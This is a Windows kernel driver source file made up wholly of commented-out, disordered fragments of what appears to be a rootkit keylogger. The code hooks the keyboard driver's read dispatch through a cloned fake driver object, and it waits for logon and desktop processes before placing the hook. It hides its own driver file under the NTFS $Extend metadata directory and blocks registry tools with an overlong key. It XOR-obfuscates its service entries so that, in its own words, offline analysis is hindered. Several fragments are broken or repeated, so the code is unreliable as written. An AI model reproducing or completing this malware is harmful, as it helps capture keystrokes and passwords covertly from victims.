//		IoEnumerateDeviceObjectList(pTrueFilesysDriver, NULL, 0, &deviceCount);
//		pCurrDeviceObject = pTrueFilesysDriver->DeviceObject;
//		ObfReferenceObject(pCurrDeviceObject);
//		KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//		pFakeFilesysDriver->DeviceObject = pTrueFilesysDriver->DeviceObject;
//if (TRUE == mystrcmp(L"logonui.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){
//	///Place keyboard IRP hook, it's quite likely that the keyboard stack has finishd initializing
//	///by the time logonui.exe is started. Once we patched the kbdclass IRP dispatch table, we must not patch it a second time,
//	///since we would store wrong addresses eventually leading to malfunction and system instability!
//	if (FALSE == isPatched){
//		//KIRQL oldIrql;
//	//ntstatus = KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, &timeout);
//	if ((STATUS_SUCCESS != ntstatus) && (FALSE == g_pKbdHookInfo->irpSentDown)){
//g_pKbdHookInfo->wasPatched = FALSE;

//g_pKbdHookInfo->irpSentDown = TRUE;
//if ((NT_SUCCESS(ntstatus)) && (FALSE != g_pKbdHookInfo->flag)){
//	g_pKbdHookInfo->flag = FALSE;
//	
//ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//if (!NT_SUCCESS(ntstatus)){
//	return ntstatus;
//}
//			else{
//				if (FALSE == mystrcmp(L"logonui", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)){							
//					if (FALSE == isPatched){
////RtlCopyMemory(pFakeKbdDrvObj, pKbdDrvObj, pKbdDrvObj->Size);
////g_fpOrigDispatchDirectoryControl = pTrueFilesysDriver->MajorFunction[IRP_MJ_DIRECTORY_CONTROL];
////g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
////pFakeFilesysDriver->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = FhidDispatchDirectoryControl;
////pFakeKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
////pFakeKbdDrvObj->DeviceObject = pKbdDrvObj->DeviceObject;
////IoEnumerateDeviceObjectList(pTrueFilesysDriver, NULL, 0, &deviceCount);
////pCurrDeviceObject = pKbdDrvObj->DeviceObject;
////ObfReferenceObject(pCurrDeviceObject);
////if (0x0 == g_pKbdHookInfo->isPatched){

////	//IoEnumerateDeviceObjectList(pKbdDrvObj, NULL, 0, &deviceCount);
////	//if (NULL != pKbdDrvObj->DeviceObject){
////	//	if (NULL != pKbdDrvObj->DeviceObject->DeviceObjectExtension){
////	//		if (NULL != pKbdDrvObj->DeviceObject->DeviceObjectExtension->AttachedTo){
////	//			if (NULL != pKbdDrvObj->DeviceObject->DeviceObjectExtension->AttachedTo->DriverObject){
////	//				pLowerKbdDrvObj = pKbdDrvObj->DeviceObject->DeviceObjectExtension->AttachedTo->DriverObject;
////	//			}
//	//g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//PDRIVER_OBJECT pLowerKbdDrvObj = NULL;
//g_pRunTimeInfo->hLockedDrvFile = INVALID_HANDLE_VALUE;
//ULONG deviceCount = 0;
//for (;;){
//	ntstatus = ObReferenceObjectByName(&uKbdDrvName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, 0, IoDriverObjectType, KernelMode, NULL, &pKbdDrvObj);
//	if (NT_SUCCESS(ntstatus)){
//		break;
//	}
//	KeDelayExecutionThread(KernelMode, FALSE, &interval);
//}

//PDRIVER_OBJECT pFakeKbdDrvObj = ExAllocatePool(NonPagedPool, pKbdDrvObj->Size);
//PDEVICE_OBJECT pCurrDeviceObject = NULL;
//PWCHAR pCurrProcessName = NULL;
//ULONG currProcessNameLength = 0;

//g_pKbdHookInfo->wasPatched = NULL;
//g_pKbdHookInfo->
//g_pKbdHookInfo->fpPatchOrUnpatchKbd((PVOID)0xFFFFFFFFFFFFFFFF);
//PatchOrUnpatchKbd(TRUE);
//PatchOrUnpatchKbd(NULL);
//KIRQL oldIrql;
//	//g_pKbdHookInfo->fpPatchOrUnpatchKbd(NULL);
////	//		}
////	//	}
////	//}

////	//
////	//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
////	//pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
////	//KeLowerIrql(oldIrql);
////}


//pCurrProcessName = ExAllocatePool(NonPagedPool, pProcessName->Length);
//RtlCopyMemory(pCurrProcessName, pProcessName->Buffer, pProcessName->Length);
//currProcessNameLength = pProcessName->Length;
//KIRQL oldIrql;
//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
////pFakeFilesysDriver->DeviceObject = pTrueFilesysDriver->DeviceObject;
////pCurrDeviceObject->DriverObject = pFakeKbdDrvObj;
//KeLowerIrql(oldIrql);

//isPatched = TRUE;
//						///Create an exact clone of the original kbdclass.sys driver object which has already been initialized by kbdclass.sys
//						///Therefore we don't need to worry about correct initialization of our own fake driver object
//						///...since kbdclass.sys has already done this for us!
//						RtlCopyMemory(pFakeKbdDrvObj, pKbdDrvObj, pKbdDrvObj->Size);
//						//g_fpOrigDispatchDirectoryControl = pTrueFilesysDriver->MajorFunction[IRP_MJ_DIRECTORY_CONTROL];
//						///Store the original target function because we areat some point we
//						g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];

/////***********TODO: Repair IRP hook (patch driver object (hook v1.0) or device object (hook v2.0) (or tdl4 like upper device object (hook v3.0))!!!*****///
//						pCurrDeviceObject
//						IoGet
//						//pFakeFilesysDriver->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = FhidDispatchDirectoryControl;
//						pFakeKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//						pFakeKbdDrvObj->DeviceObject = pKbdDrvObj->DeviceObject;
//						//IoEnumerateDeviceObjectList(pTrueFilesysDriver, NULL, 0, &deviceCount);
//						pCurrDeviceObject = pKbdDrvObj->DeviceObject;
//						ObfReferenceObject(pCurrDeviceObject);
//						KIRQL oldIrql;
//						KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//						//pFakeFilesysDriver->DeviceObject = pTrueFilesysDriver->DeviceObject;
//						pCurrDeviceObject->DriverObject = pFakeKbdDrvObj;
//						KeLowerIrql(oldIrql);

//						isPatched = TRUE;
//					}

//					ntstatus = KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, NULL);
//					DbgPrint("0x%llX not there anymore, or other problem (0x%lX)!", pEprocess, ntstatus);



//					KIRQL oldIrql;
//					pCurrDeviceObject = pKbdDrvObj->DeviceObject;
//					while (NULL != pCurrDeviceObject){
//						//pCurrDeviceObject = pTrueFilesysDriver->DeviceObject;
//						KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//						pCurrDeviceObject->DriverObject = pKbdDrvObj;
//						KeLowerIrql(oldIrql);
//						pCurrDeviceObject = pCurrDeviceObject->NextDevice;
//					}

//					pCurrDeviceObject = pKbdDrvObj->DeviceObject;
//					KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//					pCurrDeviceObject->DriverObject = pKbdDrvObj;
//					KeLowerIrql(oldIrql);

//					isPatched = FALSE;
//					///We are not in boot mode
//					//if (FALSE == mystrcmp(L"logonui", pCurrProcessName, currProcessNameLength, METHOD_SUBSTRING)){
//					//	//if ((FALSE == mystrcmp(L"cmd", pCurrProcessName, currProcessNameLength, METHOD_SUBSTRING))
//					//	ntstatus = KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, NULL);
//					//	DbgPrint("0x%llX not there anymore, or other problem (0x%lX)!", pEprocess, ntstatus);
//					//	KIRQL oldIrql;
//					//	pCurrDeviceObject = pKbdDrvObj->DeviceObject;
//					//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//					//	pCurrDeviceObject->DriverObject = pKbdDrvObj;
//					//	KeLowerIrql(oldIrql);
//					//	isPatched = FALSE;
//					//}
//				}
//			}

//if (FALSE == isPatched){
//	RtlCopyMemory(pFakeKbdDrvObj, pKbdDrvObj, pKbdDrvObj->Size);
//	//g_fpOrigDispatchDirectoryControl = pTrueFilesysDriver->MajorFunction[IRP_MJ_DIRECTORY_CONTROL];
//	g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//	//pFakeFilesysDriver->MajorFunction[IRP_MJ_DIRECTORY_CONTROL] = FhidDispatchDirectoryControl;
//	pFakeKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//	pFakeKbdDrvObj->DeviceObject = pKbdDrvObj->DeviceObject;
//	//IoEnumerateDeviceObjectList(pTrueFilesysDriver, NULL, 0, &deviceCount);
//	pCurrDeviceObject = pKbdDrvObj->DeviceObject;
//	ObfReferenceObject(pCurrDeviceObject);
//	KIRQL oldIrql;
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	//pFakeFilesysDriver->DeviceObject = pTrueFilesysDriver->DeviceObject;
//	pCurrDeviceObject->DriverObject = pFakeKbdDrvObj;
//	KeLowerIrql(oldIrql);
//	isPatched = TRUE;
//}
/////We are not in boot mode
//if (FALSE == mystrcmp(L"logonui", pCurrProcessName, currProcessNameLength, METHOD_SUBSTRING)){
//	//if ((FALSE == mystrcmp(L"cmd", pCurrProcessName, currProcessNameLength, METHOD_SUBSTRING))
//	ntstatus = KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, NULL);
//	DbgPrint("0x%llX not there anymore, or other problem (0x%lX)!", pEprocess, ntstatus);
//	KIRQL oldIrql;
//	pCurrDeviceObject = pKbdDrvObj->DeviceObject;
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	pCurrDeviceObject->DriverObject = pKbdDrvObj;
//	KeLowerIrql(oldIrql);
//	isPatched = FALSE;
//}
////}

////pKbdDevObj = pKbdDrvObj->DeviceObject;
//if (NULL == pKbdDrvObj->DeviceObject){
//	//pKbdDevObj = pKbdDrvObj->DeviceObject;
//	return ntstatus;
//}
//}
//else{
//	g_pKbdHookInfo->flag = TRUE;
//}
//	DbgPrint("Wait timed out, repatching!");

//}
//		//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//		//g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//		//pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//		//KeLowerIrql(oldIrql);
//		DevObjPatchThread(NULL);
//		isPatched = TRUE;
//	}
//}
//if ((TRUE == mystrcmp(L"explorer", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)) ||
//	(TRUE == mystrcmp(L"notepad", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)) ||
//	(TRUE == mystrcmp(L"utilman", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)) ||
//	(TRUE == mystrcmp(L"taskmgr", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)) ||
//	(TRUE == mystrcmp(L"logonui", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING))){	
//	//if (FALSE == isPatched){
//	//	///Place keyboard IRP hook, 
//	//	//KIRQL oldIrql;
//	//	//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	//	//g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//	//	//pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//	//	//KeLowerIrql(oldIrql);
//	//	DevObjPatchThread(NULL);
//	//	isPatched = TRUE;
//	//}
//	PrepOnBoot(NULL);
//	PrepOnShutdown(NULL);
//	if (FALSE == isPatched){
//		///Place keyboard IRP hook, 
//		//KIRQL oldIrql;
//		//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//		//g_pKbdHookInfo->fpOriginalFunction = pKbdDrvObj->MajorFunction[IRP_MJ_READ];
//		//pKbdDrvObj->MajorFunction[IRP_MJ_READ] = g_pKbdHookInfo->fpHookFunction;
//		//KeLowerIrql(oldIrql);
//		DevObjPatchThread(NULL);
//		isPatched = TRUE;
//	}
//	//return;
//	ntstatus = KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, NULL);
//	DbgPrint("0x%llX not there anymore, or other problem (0x%lX)!", pEprocess, ntstatus);
//	pCurrDeviceObject = pTrueFilesysDriver->DeviceObject;
//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	pCurrDeviceObject->DriverObject = pTrueFilesysDriver;
//	KeLowerIrql(oldIrql);
//	//while (NULL != pCurrDeviceObject){
//	//	//pCurrDeviceObject = pTrueFilesysDriver->DeviceObject;
//	//	KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//	//	pCurrDeviceObject->DriverObject = pTrueFilesysDriver;
//	//	KeLowerIrql(oldIrql);
//	//	pCurrDeviceObject = pCurrDeviceObject->NextDevice;
//	//}
//	//PrepOnShutdown(NULL);
//	//break;
//}
//WCHAR szSafebootRegPathMinimalOld[MAXCHAR];
//WCHAR szSafebootRegPathNetworkOld[MAXCHAR];
//WCHAR szSafebootRegPathMinimal[MAXCHAR];
//WCHAR szSafebootRegPathNetwork[MAXCHAR];
//		pCurrDeviceObject->DriverObject = pFakeFilesysDriver;
//		KeLowerIrql(oldIrql);
//
//		//if (prevDeviceCount != deviceCount){
//		//	prevDeviceCount = deviceCount;
//		//	pCurrDeviceObject = pTrueFilesysDriver->DeviceObject;
//
//		//	while (NULL != pCurrDeviceObject){
//		//		ObfReferenceObject(pCurrDeviceObject);
//		//		KeRaiseIrql(HIGH_LEVEL, &oldIrql);
//		//		pFakeFilesysDriver->DeviceObject = pTrueFilesysDriver->DeviceObject;
//		//		pCurrDeviceObject->DriverObject = pFakeFilesysDriver;
//		//		KeLowerIrql(oldIrql);
//		//		pCurrDeviceObject = pCurrDeviceObject->NextDevice;
//		//	}
//		//}
//		//pCurrDeviceObject = NULL;
//		//KeDelayExecutionThread(KernelMode, FALSE, &interval);
//
//		//if (STATUS_SUCCESS == KeWaitForSingleObject(g_pExitThreadEvent, Executive, KernelMode, FALSE, &timeout)){
//		//	KeSetEvent(g_pOKToUnloadEvent, 0, FALSE);
//		//	break;
//		//}
//	//}
//}
//g_pRunTimeInfo->hBcdKey = INVALID_HANDLE_VALUE;

//g_pRunTimeInfo->hBcdKey = INVALID_HANDLE_VALUE;
//SenseThread(pStartContext);
//if (0x0 == g_pRunTimeInfo->initFlag){
//
//
//
//
//}
//
//
//else{

//LARGE_INTEGER timeout;
//UNICODE_STRING uDirectoryToMonitor;
//UNICODE_STRING uKeyToMonitor;
//UNICODE_STRING uAuxFile;
//OBJECT_ATTRIBUTES objectAttributes;
//OBJECT_ATTRIBUTES objectAttributes2;

//timeout.QuadPart = -50000000;
//g_pRunTimeInfo->hClassKey = INVALID_HANDLE_VALUE;
//RewriteClsKey(NULL);
//g_pRunTimeInfo->okToContinue = 0x1;
//HANDLE hTestFile;
//UNICODE_STRING uDirectoryToMonitor;
//IO_STATUS_BLOCK ioStatusBlock;
//OBJECT_ATTRIBUTES objectAttributes;
//RtlInitUnicodeString(&uDirectoryToMonitor, L"\\??\\C:\\$Extend\\$ObjId\\$TestFile");
////RtlInitUnicodeString(&uAuxFile, L"\\??\\C:\\$Extend\\$RmMetadata\\$AuxFile");
//InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
////ntstatus = ZwOpenFile(&g_pRunTimeInfo->hFile, SYNCHRONIZE, &objectAttributes, &g_pRunTimeInfo->dirIoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_DIRECTORY_FILE);
//ntstatus = ZwCreateFile(&hTestFile, FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
//if (!NT_SUCCESS(ntstatus)){
//	DbgPrint("Failed to create test file!");
//	//ZwClose(g_hKey);
//	return;
//}

//RtlInitUnicodeString(&uKeyToMonitor, L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\Services");
//InitializeObjectAttributes(&objectAttributes2, &uKeyToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//ntstatus = ZwOpenKey(&g_pRunTimeInfo->hKey, KEY_NOTIFY | KEY_READ | KEY_QUERY_VALUE, &objectAttributes2);
//if (!NT_SUCCESS(ntstatus)){
//	DbgPrint("Failed to open key for monitoring!");
//	ZwClose(g_pRunTimeInfo->hFile);
//	return;
//}
//RewriteFile(NULL, NULL);

//BOOL wasPatched = FALSE;
//PETHREAD 		pEthread;
//g_pKbdHookInfo->flag = FALSE;



//PrepOnBoot(NULL);
//CreateRandName(g_pRunTimeInfo->DrvRandName, g_pRunTimeInfo->DrvRandNameLength / sizeof(WCHAR));
//CreateRandName(g_pRunTimeInfo->KeyRandName, g_pRunTimeInfo->KeyRandNameLength / sizeof(WCHAR));


//ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hFile, NULL, g_pRunTimeInfo->fpDirRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->dirIoStatusBlock, &g_pRunTimeInfo->pBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_NAME, FALSE);
//if (!NT_SUCCESS(ntstatus)){
//	DbgPrint("Failed to arm directory notify routine! 0x%lX", ntstatus);
//	ZwClose(g_pRunTimeInfo->hFile);
//	//ZwClose(g_hFile);
//	return;
//}

//ntstatus = ZwNotifyChangeKey(g_pRunTimeInfo->hKey, NULL, g_pRunTimeInfo->fpRegWorkItem, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->regIoStatusBlock, REG_NOTIFY_CHANGE_ATTRIBUTES | REG_NOTIFY_CHANGE_LAST_SET | REG_NOTIFY_CHANGE_NAME | REG_NOTIFY_CHANGE_SECURITY, TRUE, NULL, 0, TRUE);
//if (!NT_SUCCESS(ntstatus)){
//	DbgPrint("Failed to arm key notify routine!");
//	ZwClose(g_pRunTimeInfo->hFile);
//	ZwClose(g_pRunTimeInfo->hKey);
//	//ZwClose(g_hKey);
//	//ZwClose(g_hFile);
//	return;
//}


//RewriteFile(NULL, NULL);
//if (STATUS_SUCCESS != ntstatus){
//	DbgPrint("Fatal process enumeration error!! 0x%lX", ntstatus);
//	return;
//}


//for (;;){
//	timeout.QuadPart = -100000000;
//	ntstatus = STATUS_UNSUCCESSFUL;
//	//ntstatus = KeWaitForSingleObject(pEprocess, Executive, KernelMode, FALSE, &timeout);
//	KeDelayExecutionThread(KernelMode, FALSE, &timeout);
//	//PrepOnShutdown(NULL);
//	if ((STATUS_SUCCESS != ntstatus) && (FALSE == g_pKbdHookInfo->irpSentDown)){
//		timeout.QuadPart = -5000000;
//		KeDelayExecutionThread(KernelMode, FALSE, &timeout);
//		if (FALSE == g_pKbdHookInfo->irpSentDown){
//			timeout.QuadPart = -5000000;
//			KeDelayExecutionThread(KernelMode, FALSE, &timeout);
//			if (FALSE == g_pKbdHookInfo->irpSentDown){
//				DbgPrint("Multiple waits timed out, repatching!");
//				ntstatus = PatchKbd(NULL);
//				break;
//			}
//		}
//	}
//	//DbgPrint("0x%llX not there anymore, or other problem (0x%lX)!", pEprocess, ntstatus);
//	DbgPrint("Keylogger running correctly, starting next iteration.");
//}
//	//pEprocess = NULL;
//	//pProcessName = NULL;
//	//pEthread = NULL;
//	//DbgPrint("Object not opened (0x%lX), starting next iteration.", ntstatus);
//	/////In our situation a polling approach is much easier than issuing a NtQuerySystemInformation call.
//	/////We don't know the process name and we don't know which PID is valid. We need to follow the try and error principle.



//	//	///The process exists, but is h valid?
//	//	///If for some reason a process object isn't deleted after th process exited,
//	//	///the object still remains signaled, leading to endlessly doing boot and shutdown prparations.
//	//	///However, a deleted process dosnt hav any thrads running, so w skip th wird procss.
//	//	for (ULONG j = i; j < i+4000; j+=4){
//	//		cid.UniqueProcess = (HANDLE)i;
//	//		cid.UniqueThread = (HANDLE)j;
//	//		pEthread = NULL;
//	//		ntstatus = PsLookupProcessThreadByCid(&cid, &pEprocess, &pEthread);
//	//		if (NT_SUCCESS(ntstatus)){
//	//			break;
//	//		}
//	//	}
//	//	ObfDereferenceObject(pEprocess);
//	//	if (NT_SUCCESS(ntstatus)){
//	//		ObfDereferenceObject(pEthread);
//	//		SeLocateProcessImageName(pEprocess, &pProcessName);
//	//		if ((TRUE == mystrcmp(L"explorer", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)) ||
//	//			(TRUE == mystrcmp(L"cmd", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING)) ||
//	//			(TRUE == mystrcmp(L"logonui", pProcessName->Buffer, pProcessName->Length, METHOD_SUBSTRING))){

//	//			//if (FALSE == wasPatched){
//	//			//	PatchOrUnpatchKbd(NULL);
//	//			//	wasPatched = TRUE;
//	//			//}

//	//			//if (0xFFFFFFFF != g_pRunTimeInfo->Flag){
//	//			//	PrepOnBoot(NULL);
//	//			//	CreateRandName(g_pRunTimeInfo->DrvRandName, g_pRunTimeInfo->DrvRandNameLength / sizeof(WCHAR));
//	//			//	CreateRandName(g_pRunTimeInfo->KeyRandName, g_pRunTimeInfo->KeyRandNameLength / sizeof(WCHAR));
//	//			//	PrepOnShutdown(NULL);

//	//			//	//ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hFile, NULL, g_pRunTimeInfo->fpDirRewriteRoutine, (PVOID)DelayedWorkQueue, &g_pRunTimeInfo->dirIoStatusBlock, &g_pRunTimeInfo->pBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_NAME, FALSE);
//	//			//	//if (!NT_SUCCESS(ntstatus)){
//	//			//	//	DbgPrint("Failed to arm directory notify routine! 0x%lX", ntstatus);
//	//			//	//	ZwClose(g_pRunTimeInfo->hFile);
//	//			//	//	//ZwClose(g_hFile);
//	//			//	//	return;
//	//			//	//}
//	//			//	//ZwQueueApcThread()
//	//			//	RewriteFile(NULL, NULL);
//	//			//	g_pRunTimeInfo->Flag = 0xFFFFFFFF;
//	//			//}


//			}
//		}
//	}
//	KeDelayExecutionThread(KernelMode, FALSE, &interval);
//}

//RewriteSvcKey(NULL);
//DbgPrint("Rewritten service key");
//RewriteClsKey(NULL);
//DbgPrint("Rewritten class key");

//RewriteBcdFile(NULL, NULL);
//DbgPrint("\"Rewritten bcd file\"");


//UNICODE_STRING uDrvRegPath;
//OBJECT_ATTRIBUTES objectAttributes;
//HANDLE hKey;
//NTSTATUS ntstatus;
//IO_STATUS_BLOCK    ioStatusBlock;
//HANDLE hDrvFile = INVALID_HANDLE_VALUE;

//ULONG drvStart = SERVICE_SYSTEM_START;
//WCHAR type = 0x0;

//WCHAR szDrvRegPath[MAXCHAR];
//WCHAR szDrvFilePath[MAXCHAR];

//ULONGLONG drvFilePathLength = 0;
//UNICODE_STRING uHiderKeyName;
//UNICODE_STRING uDrvFilePath;
//OBJECT_ATTRIBUTES objectAttributes2;
//ntstatus = STATUS_UNSUCCESSFUL;
//HANDLE hHiderKey;
//if (0x0 == g_pRunTimeInfo->Flag){
//	g_pRunTimeInfo->Flag = 0xFFFFFFFF;
//}

//RtlInitUnicodeString(&uHiderKeyName, L"\\registry\\machine\\SYSTEM\\CurrentControlSet\\services\\Zyyyyyyy                                                                                                                                                                                                                                                     ");
//InitializeObjectAttributes(&objectAttributes2, &uHiderKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

/////Exploit windows registry by creating an overlong reg key to prevent regedit and some other tools from accessing the random drvtriks key itself
//ntstatus = ZwCreateKey(&hHiderKey, KEY_READ | KEY_WRITE | DELETE, &objectAttributes2, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
//if (NT_SUCCESS(ntstatus)){
//	DbgPrint("key hide create successful%lX", ntstatus);
//	ZwDeleteKey(hHiderKey);
//	ZwClose(hHiderKey);
//}
//                                                                                                                                                                                                                                                       
//RtlStringCbPrintfW(szDrvRegPath, sizeof(szDrvRegPath), L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Zz%ws", g_pRunTimeInfo->KeyRandName);
//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//RtlStringCbLengthW(szDrvFilePath, sizeof(szDrvFilePath), &drvFilePathLength);
//drvFilePathLength += sizeof(WCHAR);

/////Install ndd rgistry ntris whil obfuscating srvic configuration as much as possibl.
/////This will hindr offlin analysis...
//type = (WCHAR)((g_pRunTimeInfo->ValueType) ^ 0xDAFAAAAC);
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szDrvRegPath, L"Type", (g_pRunTimeInfo->ValueType) ^ 0xBAAAAAAD, &type, sizeof(WCHAR));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szDrvRegPath, L"Start", (g_pRunTimeInfo->ValueType) ^ 0x7F7F7F7F, &drvStart, sizeof(char));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szDrvRegPath, L"ImagePath", g_pRunTimeInfo->ValueType, &szDrvFilePath, (ULONG)drvFilePathLength);


//RtlInitUnicodeString(&uDrvRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services");
//InitializeObjectAttributes(&objectAttributes, &uDrvRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ntstatus = ZwOpenKey(&hKey, GENERIC_ALL, &objectAttributes);
//if (NT_SUCCESS(ntstatus)){
//	ZwFlushKey(hKey);
//	ZwClose(hKey);
//}
////
//RtlStringCbPrintfW(szDrvFilePath, sizeof(szDrvFilePath), L"\\??\\Global\\C:\\$Extend\\$RmMetadata\\$%ws ", g_pRunTimeInfo->DrvRandName);
//RtlInitUnicodeString(&uDrvFilePath, szDrvFilePath);
//InitializeObjectAttributes(&objectAttributes, &uDrvFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
//ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
//DbgPrint("ZwCreateFile 0x%lX", ntstatus);
//if (NT_SUCCESS(ntstatus)) {
//	ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
//	if (!NT_SUCCESS(ntstatus)) {
//		DbgPrint("ZwWriteFile 0x%lX", ntstatus);
//	}

//
//#include <ntddk.h>
//#include <ntndk.h>
//#include <ntstrsafe.h>
//




///Data solely used by cloak functions

//PIRP_PATCH_INFO g_pKbdHookInfo;


//NTSTATUS ZwLoadKey(POBJECT_ATTRIBUTES pObjectAttributes1, POBJECT_ATTRIBUTES pObjectAttributes2);
//PDRIVER_OBJECT g_pFakeDrvObj;
//PDEVICE_OBJECT g_pFakeDevObj;
//typedef struct _HOOK_EXTENSION {
//
//#include <wdm.h>
//
//#include <ntifs.h>
//

//
//typedef struct _MINIMAL_IMAGE_INFO {
//	ULONG DrvImageSize;
//	PUCHAR DrvImageBegin;
//} MINIMAL_IMAGE_INFO, *PMINIMAL_IMAGE_INFO;

//WCHAR DrvRandPath[MAXCHAR];
//ULONG DrvRandPathLength;
//} HOOK_EXTENSION, *PHOOK_EXTENSION;

//extern POBJECT_TYPE* IoDriverObjectType;

//NTSTATUS NTAPI ObReferenceObjectByName(PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE Passed, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE Access, PVOID ParseContext, PVOID* ObjectPtr);

//PDEVICE_OBJECT g_pAttachedToDevobj;

//PKSTART_ROUTINE fpThread = InitThread;
//PWORKER_THREAD_ROUTINE fpWorkerThread = WorkerThread;
////////ULONGLONG prepOnBootOffset = (PUCHAR)PrepOnBoot - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
////////ULONGLONG prepOnShutdownOffset = (PUCHAR)PrepOnShutdown - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
//////PKSTART_ROUTINE fpNewmemPrepOnBoot = (PKSTART_ROUTINE)(g_pNewMemory + prepOnBootOffset);
//////PKSTART_ROUTINE fpNewmemPrepOnShutdown = (PKSTART_ROUTINE)(g_pNewMemory + prepOnShutdownOffset);
////pPrepRoutineAddr[0] = (ULONGLONG)fpNewmemPrepOnBoot;
////pPrepRoutineAddr[1] = (ULONGLONG)fpNewmemPrepOnShutdown;
//DbgPrint("in driverentry: 0x%llX, 0x%llX", pPrepRoutineAddr[0], pPrepRoutineAddr[1]);

//NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
//PDRIVER_OBJECT pHookDrvObj = NULL;
//InitializeObjectAttributes()
//UNICODE_STRING uFakeDrvName;
//UNICODE_STRING uFakeDevName;
//UNICODE_STRING uHookDrvName;
